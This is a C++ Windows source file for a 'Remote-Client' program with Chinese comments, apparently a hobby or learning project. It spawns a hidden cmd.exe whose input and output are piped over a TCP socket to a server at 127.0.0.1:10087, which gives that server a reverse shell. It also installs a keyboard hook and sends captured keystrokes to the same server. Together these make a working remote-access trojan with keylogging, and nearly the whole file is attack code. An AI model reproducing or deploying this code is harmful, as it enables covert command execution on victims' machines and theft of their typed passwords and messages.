// Remote-Client.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "Remote-Client.h"
#include<iostream>
#include<WinSock2.h>
#include<Windows.h>
#include<thread>
#pragma comment(lib,"ws2_32.lib")
#include"DATA.h"
#pragma comment(lib,"C:/Users/19100/Desktop/Remote/bin/HOOK.lib")
using namespace std;
int mykeyboardhook(HWND hwnd);

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名


bool ret;

HANDLE myhwritepipe;
HANDLE cmdhreadpipe;

HANDLE cmdhwritepipe;
HANDLE myhreadpipe;

SOCKET s;


DWORD WINAPI recvandsendthread(LPVOID lparam)
{
    int getdate;
    while (true)
    {
        char rbuf[30] = { 0 };
        getdate = recv(s, rbuf, sizeof(unsigned int)*2, 0);
        DATA* drbuf = (DATA*)rbuf;
        if (getdate > 0 && (drbuf->type == SEVER_CMD_COMMAND))
        {

            char rdata[260] = {0};
            recv(s, rdata, drbuf->length, 0);
            DWORD realwlength;
            DWORD wlength = strlen(rdata);
            rdata[wlength++] = '\n';
            WriteFile(myhwritepipe, rdata, wlength, &realwlength, NULL);


            while (TRUE)
            {
                Sleep(100);
                DWORD isnull = 0;
                ret = PeekNamedPipe(myhreadpipe, 0, 1, &isnull, 0, 0);
                if (!isnull)  break;

                char backdata[300] = { 0 };
                DWORD realrlength;
                ReadFile(myhreadpipe, backdata, 255, &realrlength, NULL);
                char size[300] = { 0 };
                DATA *cmdback = (DATA*)size;
                cmdback->length = strlen(backdata) + 1;
                cmdback->type = CLIENT_CMD_BACK;
                memcpy(cmdback->reallydata, backdata, cmdback->length);
                send(s, (char*)cmdback, cmdback->length+sizeof(unsigned int)*2, 0);

            }
        }
        else
        {
            break;
        }
    }

    //while (true)
    //{
    //    int getdate = 0;
    //    char rbuf[256] = { 0 };
    //    getdate = recv(s, rbuf, sizeof(unsigned int) * 2, 0);
    //    DATA* datapacket = (DATA*)rbuf;
    //    if (getdate > 0)
    //    {
    //        if (datapacket->type == SEVER_CMD_COMMAND)
    //        {
    //            char data[256] = { 0 };
    //            recv(s, data, datapacket->length, 0);
    //            //输出cmd数据
    //            DWORD realwlength;
    //            DWORD wlength = strlen(data);
    //            rbuf[wlength++] = '\n';
    //            WriteFile(myhwritepipe, data, wlength, &realwlength, NULL);


    //            while (TRUE)
    //            {
    //                Sleep(100);
    //                DWORD isnull = 0;
    //                ret = PeekNamedPipe(myhreadpipe, 0, 1, &isnull, 0, 0);
    //                if (!isnull)  break;


    //                char backdatasize[256] = { 0 };
    //                char backdata[256] = { 0 };
    //                DATA* CMD_BACK_DATA = (DATA*)backdatasize;
    //                DWORD realrlength;
    //                ReadFile(myhreadpipe, backdata, 255, &realrlength, NULL);
    //                CMD_BACK_DATA->type = CLIENT_CMD_BACK;
    //                CMD_BACK_DATA->length = strlen(backdata) + 1;
    //                memcpy(CMD_BACK_DATA->reallydata, backdata, CMD_BACK_DATA->length);
    //                send(s, (char*)CMD_BACK_DATA, 255, 0);

    //            }
    //        }
    //    }
    //    else if (getdate <= 0)
    //    {
    //        //输出xx客户端断开连接
    //        break;
    //    }
    //}
    return true;
}
// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: 在此处放置代码。

    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return 0;
    }

    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;


    ret = CreatePipe(&cmdhreadpipe, &myhwritepipe, &sa, 0);
    ret = CreatePipe(&myhreadpipe, &cmdhwritepipe, &sa, 0);

    STARTUPINFO st = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    //TCHAR a[] = TEXT("/c calc");

    st.cb = sizeof(STARTUPINFO);
    st.dwFlags = STARTF_USESTDHANDLES;
    st.hStdInput = cmdhreadpipe;
    st.hStdOutput = cmdhwritepipe;
    st.hStdError = cmdhwritepipe;

    ret = CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"),
        NULL,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &st,
        &pi
        );
    Sleep(300);

    //1.socket
    s = socket(AF_INET, SOCK_STREAM, 0);
    //2.connet
    sockaddr_in addr;
    int length = sizeof(sockaddr_in);
    addr.sin_family = AF_INET;


    addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(10087);

    connect(s, (sockaddr*)&addr, length);
    
    CreateThread(0, 0, recvandsendthread, 0, 0, 0);
    //thread recvandsendthread([&]() {


    //    while (true)
    //    {



    //        int getdate = 0;
    //        char rbuf[256] = { 0 };
    //        getdate = recv(s, rbuf, sizeof(unsigned int)*2, 0);
    //        DATA* datapacket = (DATA*)rbuf;
    //        if (getdate > 0)
    //        {
    //            if (datapacket->type == SEVER_CMD_COMMAND)
    //            {
    //                char data[256] = { 0 };
    //                recv(s, data, datapacket->length, 0);
    //                //输出cmd数据
    //                DWORD realwlength;
    //                DWORD wlength = strlen(data);
    //                rbuf[wlength++] = '\n';
    //                WriteFile(myhwritepipe, data, wlength, &realwlength, NULL);


    //                while (TRUE)
    //                {
    //                    Sleep(100);
    //                    DWORD isnull = 0;
    //                    ret = PeekNamedPipe(myhreadpipe, 0, 1, &isnull, 0, 0);
    //                    if (!isnull)  break;


    //                    char backdatasize[256] = { 0 };
    //                    char backdata[256] = { 0 };
    //                    DATA* CMD_BACK_DATA = (DATA*)backdatasize;
    //                    DWORD realrlength;
    //                    ReadFile(myhreadpipe, backdata, 255, &realrlength, NULL);
    //                    CMD_BACK_DATA->type = CLIENT_CMD_BACK;
    //                    CMD_BACK_DATA->length = strlen(backdata) + 1;
    //                    memcpy(CMD_BACK_DATA->reallydata, backdata, CMD_BACK_DATA->length);
    //                    send(s, (char*)CMD_BACK_DATA, 255, 0);

    //                }
    //            }
    //        }
    //        else if (getdate <= 0)
    //        {
    //            //输出xx客户端断开连接
    //            break;
    //        }
    //    }
    //});

    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_REMOTECLIENT, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_REMOTECLIENT));

    MSG msg;

    // 主消息循环:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_REMOTECLIENT));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_REMOTECLIENT);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   mykeyboardhook(hWnd);


   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COPYDATA:
        {
            PCOPYDATASTRUCT cd = (PCOPYDATASTRUCT)lParam;
            const char* pstr = (const char*)cd->lpData;

            char temp[256] = {0};
            DATA* data = (DATA*)temp;
            data->length = strlen(pstr) + 1;
            data->type = CLIENT_KEYBOARD_BACK;
            memcpy(data->reallydata, pstr, data->length);
            send(s, (char*)data, data->length + sizeof(unsigned int) * 2, 0);
        }
        break;
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // 分析菜单选择:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
